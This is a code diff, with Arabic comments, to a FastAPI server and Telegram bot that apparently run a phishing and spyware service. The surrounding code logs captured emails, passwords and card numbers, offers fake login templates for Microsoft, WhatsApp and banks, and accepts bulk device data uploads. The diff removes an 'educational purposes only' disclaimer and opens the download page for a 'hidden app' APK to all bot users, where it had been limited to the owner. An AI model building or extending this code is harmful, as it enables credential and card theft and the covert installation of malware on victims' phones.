@@ -53,7 +53,7 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# ==================== مسار تقديم ملف APK مباشرة ====================
+# ==================== مسار تقديم ملف APK ====================
 @app.get("/app.apk")
 async def serve_apk():
     """تقديم ملف APK من جذر المشروع"""
@@ -203,7 +203,7 @@ def log_credentials(owner_chat_id, login_type, email, password, card_number, car
     except Exception as e:
         logger.error(f"⚠️ فشل تسجيل بيانات الدخول: {e}")
 
-# ==================== صفحة تسجيل الدخول الأساسية ====================
+# ==================== صفحة تسجيل الدخول ====================
 def get_login_html():
     return """
     <!DOCTYPE html>
@@ -306,10 +306,9 @@ def get_login_html():
     </html>
     """
 
-# ==================== صفحة تحميل التطبيق (الجذابة) ====================
+# ==================== صفحة تحميل التطبيق ====================
 @app.get("/download", response_class=HTMLResponse)
 async def download_page():
-    """صفحة تحميل التطبيق مع خلفية متحركة وزر تحميل"""
     return """
     <!DOCTYPE html>
     <html lang="ar" dir="rtl">
@@ -411,7 +410,17 @@ async def download_page():
     </html>
     """
 
-# ==================== نقاط API لاستقبال البيانات ====================
+# ==================== نقاط API ====================
+
+@app.post("/api/web-login")
+async def api_web_login(data: dict):
+    chat_id = data.get("chat_id")
+    username = data.get("username")
+    password = data.get("password")
+    if try_login_user(chat_id, username, password):
+        bot.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح.")
+        return {"status": "success"}
+    return {"status": "error", "message": "بيانات غير صحيحة"}
 
 @app.post("/api/upload_all_data")
 async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
@@ -468,16 +477,6 @@ async def upload_all_data(request: Request, background_tasks: BackgroundTasks):
         logger.error(f"Upload Error: {traceback.format_exc()}")
         return JSONResponse(status_code=500, content={"status": "error"})
 
-@app.post("/api/web-login")
-async def api_web_login(data: dict):
-    chat_id = data.get("chat_id")
-    username = data.get("username")
-    password = data.get("password")
-    if try_login_user(chat_id, username, password):
-        bot.send_message(chat_id, "✅ تم تسجيل الدخول بنجاح.")
-        return {"status": "success"}
-    return {"status": "error", "message": "بيانات غير صحيحة"}
-
 # ==================== أوامر البوت ====================
 
 @bot.message_handler(commands=['start'])
@@ -523,9 +522,32 @@ def show_main_menu(chat_id):
         InlineKeyboardButton("🔑 مايكروسوفت", callback_data="gen_microsoft"),
         InlineKeyboardButton("💬 واتساب", callback_data="gen_whatsapp"),
         InlineKeyboardButton("💳 بنك", callback_data="gen_bank"),
+        InlineKeyboardButton("📲 تحميل التطبيق", callback_data="open_app_download"),
         InlineKeyboardButton("🔄 تحديث الجلسة", callback_data="gen_refresh")
     )
     bot.send_message(chat_id, "👑 اختر القالب المناسب:", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data == "open_app_download")
+def open_app_download(call):
+    try:
+        bot.answer_callback_query(call.id, "جاري فتح صفحة التحميل...")
+        markup = InlineKeyboardMarkup()
+        markup.add(
+            InlineKeyboardButton(
+                "📲 افتح صفحة التحميل",
+                web_app=WebAppInfo(url=f"{RENDER_URL}/download")
+            )
+        )
+        bot.send_message(
+            call.message.chat.id,
+            "🔽 **صفحة تحميل التطبيق الخفي**\n\n"
+            "اضغط على الزر أدناه لفتح صفحة التحميل.",
+            reply_markup=markup,
+            parse_mode="Markdown"
+        )
+    except Exception as e:
+        logger.error(f"خطأ في فتح صفحة التحميل: {e}")
+        bot.send_message(call.message.chat.id, f"❌ خطأ: {str(e)}")
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("gen_"))
 def gen_link(call):
@@ -565,30 +587,6 @@ def gen_link(call):
     except Exception as e:
         logger.error(f"💥 خطأ: {traceback.format_exc()}")
         bot.send_message(chat_id, f"⚠️ عطل تقني: {str(e)[:100]}")
-
-# ==================== أمر فتح صفحة تحميل التطبيق ====================
-@bot.message_handler(commands=['app'])
-def app_command(message):
-    chat_id = message.chat.id
-    if chat_id != OWNER_ID:
-        bot.send_message(chat_id, "⛔ أمر خاص بصاحب النظام فقط.")
-        return
-
-    markup = InlineKeyboardMarkup()
-    markup.add(
-        InlineKeyboardButton(
-            "📲 افتح صفحة التحميل",
-            web_app=WebAppInfo(url=f"{RENDER_URL}/download")
-        )
-    )
-    bot.send_message(
-        chat_id,
-        "🔽 **صفحة تحميل التطبيق الخفي**\n\n"
-        "اضغط على الزر أدناه لفتح صفحة التحميل، ثم اضغط على زر 'تحميل الآن' لتحميل APK مباشرة.\n\n"
-        "⚠️ هذا التطبيق مخصص للأغراض التعليمية فقط.",
-        reply_markup=markup,
-        parse_mode="Markdown"
-    )
 
 # ==================== تشغيل الخادم ====================
 @app.on_event("startup")
